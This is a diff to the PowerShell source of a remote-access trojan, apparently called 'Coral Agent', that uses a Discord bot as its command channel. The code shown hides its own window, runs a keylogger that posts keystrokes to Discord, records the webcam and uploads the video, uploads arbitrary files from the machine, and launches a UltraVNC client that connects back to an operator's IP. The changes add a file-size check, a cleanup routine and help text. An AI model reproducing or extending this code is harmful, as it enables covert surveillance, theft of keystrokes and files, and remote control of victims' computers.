@@ -5,6 +5,11 @@ $global:hidewindow = $true
 $global:keyloggerstatus = $false
 
 
+
+
+# =============================================================== CORE DISCORD FUNCTIONS =========================================================================
+
+# for rate limiting 
 function Invoke-DiscordAPI {
     param(
         [string]$Url,
@@ -42,10 +47,6 @@ function Invoke-DiscordAPI {
         }
     } while ($attempt -le $RetryCount)
 }
-
-
-# =============================================================== CORE DISCORD FUNCTIONS =========================================================================
-
 # Get bot user ID function
 Function Get_BotUserId {
     $headers = @{ 'Authorization' = "Bot $global:token" }
@@ -64,7 +65,6 @@ Function CheckCategoryExists {
     $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
     $channelList = $channels | ConvertFrom-Json
     
-    # Rest of function remains the same...
     foreach ($channel in $channelList) {
         if ($channel.type -eq 4 -and $channel.name -eq $env:COMPUTERNAME) {
             $global:CategoryID = $channel.id
@@ -78,10 +78,10 @@ Function CheckCategoryExists {
     }
     return $false
 }
+
 # Create a new category for text channels function
 Function NewChannelCategory{
     $headers = @{ 'Authorization' = "Bot $token" }
-    
     $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
     $guilds = $response | ConvertFrom-Json
     $guildID = $guilds[0].id
@@ -185,6 +185,7 @@ function Send_SingleMessage {
         }
     }
 }
+
 # Send message in chunks
 function Send_ChunkedMessage {
     param([string]$Content)
@@ -204,14 +205,9 @@ function Send_ChunkedMessage {
     for ($i = 0; $i -lt $chunks.Count; $i++) {
         $partNumber = $i + 1
         $chunkContent = "**Part $partNumber/$totalChunks :**`n``````$($chunks[$i])``````"
-        
         Send_SingleMessage -Content $chunkContent
-        
-        # Small delay to avoid rate limiting
         Start-Sleep -Milliseconds 750
     }
-    
-    # Send completion message
     Send_SingleMessage -Content ":white_check_mark: **Output complete ($totalChunks parts sent)**"
 }
 
@@ -320,9 +316,25 @@ function Clean_MessageContent {
     
     return $cleaned
 }
+
 # Send file to discord channel function
 function sendFile {
     param([string]$sendfilePath)
+
+    if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
+        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
+        return
+    }
+
+    $fileInfo = Get-Item $sendfilePath
+    $fileName = $fileInfo.Name
+    $fileSize = $fileInfo.Length
+    $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
+    
+    if ($fileSize -gt 10MB) {
+        sendMsg -Message ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."
+        return
+    }
 
     $url = "https://discord.com/api/v10/channels/$SessionID/messages"
     $webClient = New-Object System.Net.WebClient
@@ -330,9 +342,9 @@ function sendFile {
     if ($sendfilePath) {
         if (Test-Path $sendfilePath -PathType Leaf) {
             $response = $webClient.UploadFile($url, "POST", $sendfilePath)
-            #Write-Host "Attachment sent to Discord: $sendfilePath"
+
         } else {
-            #Write-Host "File not found: $sendfilePath"
+            sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
         }
     }
 }
@@ -352,7 +364,7 @@ Function PullMsg {
     }
 }
 
-# hide window ---
+
 function HideWindow {
     $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
     $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -367,9 +379,8 @@ function HideWindow {
         $Type::ShowWindowAsync($hwnd, 0)
     }
 }
+
 # key logger ---
-
-
 function keylogger {
     param (
         [int]$intervalSeconds = 30,
@@ -443,10 +454,8 @@ function keylogger {
                     $errorMsg = $_.Exception.Message
                     
                     if ($errorMsg -match "429" -or $errorMsg -match "Too Many Requests") {
-                        #Write-Host "Rate limited, waiting before retry $retryCount/$maxRetries..."
                         Start-Sleep -Seconds (5 * $retryCount)
                     } else {
-                        #Write-Host "Error setting up keylog channel: $errorMsg"
                         if ($retryCount -eq $maxRetries) {
                             $keylogChannelID = $originalSessionID
                             sendMsg -Message ":warning: **Could not create keylog channel, using main channel**"
@@ -597,6 +606,7 @@ function keylogger {
         sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
     }
 }
+
 
 function Start_Keylogger {
     param([int]$intervalSeconds = 30)
@@ -824,26 +834,16 @@ function Webcam {
             $VideoCapture.Stop()
             return
         }
-        
         Start-Sleep -seconds $RecordTime
         $VideoCapture.stop()
-        
         # Check if file was created and send it
         if (Test-Path $OutPath) {
-            $fileSize = [math]::Round((Get-Item $OutPath).Length / 1KB, 2)
+            sendMsg -Message ":video_camera: **Webcam recording completed** (Duration: ${RecordTime}s)"
+            sendFile -sendfilePath $OutPath
+            # Clean up temp file
+            Start-Sleep -Seconds 2
+            Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
             
-            # Check file size limit (Discord has 8MB limit for free accounts)
-            if ((Get-Item $OutPath).Length -gt 8MB) {
-                sendMsg -Message ":warning: **Video file too large for Discord** (Size: $fileSize KB). Use shorter recording time."
-                Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
-            } else {
-                sendMsg -Message ":video_camera: **Webcam recording completed** (Duration: ${RecordTime}s, Size: $fileSize KB)"
-                sendFile -sendfilePath $OutPath
-                
-                # Clean up temp file
-                Start-Sleep -Seconds 2
-                Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
-            }
         } else {
             sendMsg -Message ":x: **Failed to create webcam recording file**"
         }
@@ -1102,11 +1102,13 @@ function Cleanup_CoralAgent {
             Stop_Keylogger
         }
         
+        
     } catch {
         # Ignore cleanup errors
     }
     
 }
+
 # Trap for unexpected script termination
 trap {
     try {
@@ -1200,6 +1202,10 @@ function display_help{
 **File Operations:**
 - **SENDFILE <filepath>:** Upload a file to Discord
 
+**UVNC Commands:**
+- **STARTUVNC <ip> <port>:** Start the UVNC client
+
+
 "
     sendMsg -Message $message
 }
@@ -1222,13 +1228,19 @@ Function StartUvnc{
     }
     Start-Sleep 1
     Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
-    Start-Sleep 1
+    Start-Sleep 1 
     rm -Path $vncZip -Force  
     $proc = "$tempFolder\winvnc.exe"
     Start-Process $proc -ArgumentList ("-run")
     Start-Sleep 2
     Start-Process $proc -ArgumentList ("-connect $ip::$port")
     
+}
+
+Function RemoveUVNC{
+    sendMsg -Message ":wastebasket: ``Removing UVNC files...`` :wastebasket:"
+    $tempFolder = "$env:temp\vnc"
+    rm -Path $tempFolder -Force 
 }
 # =============================================================== MAIN LOOP =========================================================================
 
@@ -1270,6 +1282,7 @@ while ($true) {
                 sendMsg -Message "**$env:COMPUTERNAME disconnecting from Coral Network**"
                 Stop_AllAgentJobs
                 Cleanup-CoralAgent
+                RemoveUVNC
                 exit 
             }
             default {
